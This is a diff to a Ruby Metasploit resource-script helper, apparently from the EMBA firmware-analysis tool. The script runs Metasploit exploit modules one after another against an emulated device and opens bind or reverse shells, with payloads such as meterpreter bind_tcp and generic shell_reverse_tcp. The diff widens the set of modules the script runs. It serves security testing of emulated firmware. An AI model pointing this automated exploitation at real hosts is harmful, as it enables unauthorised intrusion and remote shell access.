@@ -9,11 +9,11 @@ def help_me
     a real exploitation attempt. This could corrupt our emulated system. This EMBA
     module is typically used at the end of the automated analysis procedure.
     You can also setup the emulated device afterwards manually and check the 
-    Metasploit RC script against it.
+    Metasploit RC script against it with the following arguments.
 
   Usage:
-    ./msfconsole -r [rc_path] [ip_address] [list_of_ports]
-    ./msfconsole -r ./helpers/msf-check.rc 127.0.0.1 123,1337,101
+    ./msfconsole -r [rc_path] [ip_address] [list_of_ports] [arch]
+    ./msfconsole -r ./helpers/msf-check.rc 127.0.0.1 123,1337,101 mipsle
   |
 
   help = help.gsub(/^\t/, '')
@@ -35,10 +35,11 @@ end
 
 def select_payload(exploit,arch)
   linux   = "linux/#{arch}/shell_bind_tcp"
-  php     = 'php/meterpreter_reverse_tcp'
-  multi   = 'java/meterpreter/reverse_tcp'
+  php     = 'php/meterpreter/bind_tcp'
+  multi   = 'java/meterpreter/bind_tcp'
   cmd     = 'cmd/unix/interact'
-  generic = 'generic/shell_bind_tcp'
+  # generic = 'generic/shell_bind_tcp'
+  generic = 'generic/shell_reverse_tcp'
 
   payloads = []
   exploit.compatible_payloads.each do |p|
@@ -74,7 +75,7 @@ def exploit_checker(host,ports,architecture)
     end
 
     # remove modules that we won't check:
-    next if not (name =~ /dlink_upnp/)
+    #next if not (name =~ /dlink_upnp/)
     next if (name =~ /local/ or
              name =~ /fileformat/ or
              name =~ /browser/)
@@ -86,10 +87,10 @@ def exploit_checker(host,ports,architecture)
                  name =~ /openbsd/)
     # remove modules with known issues:
     next if (name =~ /cve_2020_13160_anydesk/ or
-             name =~ /goahead_ldpreload/)
+             name =~ /goahead_ldpreload/ or
+             name =~ /atutor_filemanager_traversal/)
 
 
-    print_line("")
     ports.split(",").each { |serv|
       # we test only matching ports - default RPORT of module matches
       # open port we identified in emulation phase
@@ -97,14 +98,7 @@ def exploit_checker(host,ports,architecture)
 
       mod.datastore['VERBOSE'] = "true"
       mod.datastore['RHOSTS'] = host.to_s
-      #mod.datastore['LHOST'] = "0.0.0.0"
-      #mod.datastore['VHOST'] = "0.0.0.0"
-      #mod.datastore['SRVHOST'] = "0.0.0.0"
-      #srvportt_setting = rand(4000..40_862).to_s
-      #mod.datastore['SRVPORT'] = srvportt_setting
-      # set random LPORT to open enough listeners for reverse connections:
-      lport_setting = rand(4000..40_862).to_s
-      mod.datastore['LPORT'] = lport_setting
+
       if architecture == "mipsbe"
         # mipsle is mostly target 1
         mod.datastore['TARGET'] = 1
@@ -113,62 +107,59 @@ def exploit_checker(host,ports,architecture)
         # mipsle is mostly target 0
         mod.datastore['TARGET'] = 0
       end
-        
 
       print_status("Checking #{name} against host #{host.to_s}:#{serv} ...")
       begin
-        #check_code = mod.check_simple({'RunAsJob': true, 'LocalOutput': self.output})
-        check_code = mod.check_simple({'RunAsJob': true})
+        result = mod.check_simple({'RunAsJob': true, 'LocalOutput': self.output})
         if mod.job_id
           print_status("Check #{name} job ID for target #{host.to_s} is: #{mod.job_id}")
           @job_ids << mod.job_id
         end
-        print_status("Check code for #{name}: #{check_code.to_s}")
-        if (check_code =~ /Vulnerable/ or check_code =~ /Appears/)
-          print_good("Vulnerability identified with #{check_code} - module #{name} - #{host.to_s}:#{serv}")
+        print_status("Check code for #{name}: #{result.to_s}")
+        if (result =~ /Vulnerable/ or result =~ /Appears/)
+          print_good("Vulnerability identified with #{result} - module #{name} - #{host.to_s}:#{serv}")
         end
+        print_line(Msf::Exploit::CheckCode)
+        if (result =~ /Safe/)
+          print_status("Check code is safe - skipping exploitation")
+        end
+        next if (result =~ /safe/)
       rescue ::Exception => e
         print_error(e.message)
       end
 
       print_status("Exploiting #{name} against host #{host.to_s}:#{serv} ...")
       get_payload = select_payload(mod,architecture)
-      # lhost       = Rex::Socket.source_address('50.50.50.50')
-      #lhost = "0.0.0.0"
-      #mod.datastore['LHOST'] = lhost
       mod.datastore['RHOST'] = host.to_s
 
       if get_payload.nil?
-        #raise RuntimeError, "No payload selected for this exploit"
         print_error("No payload selected for this exploit: #{name}")
       else
         print_status("Payload selected: #{get_payload}")
       end
 
       begin
-        #lport_setting = rand(4000..40_862).to_s
-        mod.datastore['LPORT'] = 4444
-        #lport_setting
-        print_status("#{mod.datastore}")
-        session = mod.exploit_simple({'RunAsJob': false, 'LocalOutput': self.output})
+        lport_setting = rand(4000..40_862).to_s
+        mod.datastore['LPORT'] = lport_setting
+        if get_payload.to_s =~ /reverse/
+          mod.datastore['LHOST'] = Rex::Socket.source_address("#{host.to_s}") 
+          # print_line("Setting LHOST to #{mod.datastore['LHOST']}")
+        end
+        # print_line("Setting LPORT to #{mod.datastore['LPORT']}")
+        mod.datastore['PAYLOAD'] = "#{get_payload}"
+        result = mod.exploit_simple({'RunAsJob': true, 'LocalOutput': self.output})
+        # looks like the job handling does not work as expected - mod.job_id is empty
         if mod.job_id
           print_status("Exploit #{name} job ID for target #{host.to_s} is: #{mod.job_id}")
           @job_ids << mod.job_id
         end
-        print_status("Exploit code for #{name}: #{session}")
-        #if (exploit_code =~ /Vulnerable/ or check_code =~ /Appears/)
-        #  print_good("Vulnerability identified with #{check_code} - module #{name} - #{host.to_s}:#{serv}")
-        #end
+        if (result.to_s =~ /Sessions/)
+          print_good("Vulnerability identified for module #{name} - #{host.to_s}:#{serv}")
+          print_good("Session state #{result} for module #{name} - #{host.to_s}:#{serv}")
+        end
       rescue ::Exception => e
         print_error(e.message)
       end
-
-
-      #run_single("exploit -j")
-      #lport_setting = rand(4000..40_862).to_s
-      #run_single("set LPORT #{lport_setting}")
-      #run_single("set PAYLOAD linux/#{architecture}/shell_bind_tcp")
-      #run_single("exploit -j")
     }
   }
   print_status("All exploits sent to #{host} ... lets wait a few seconds")
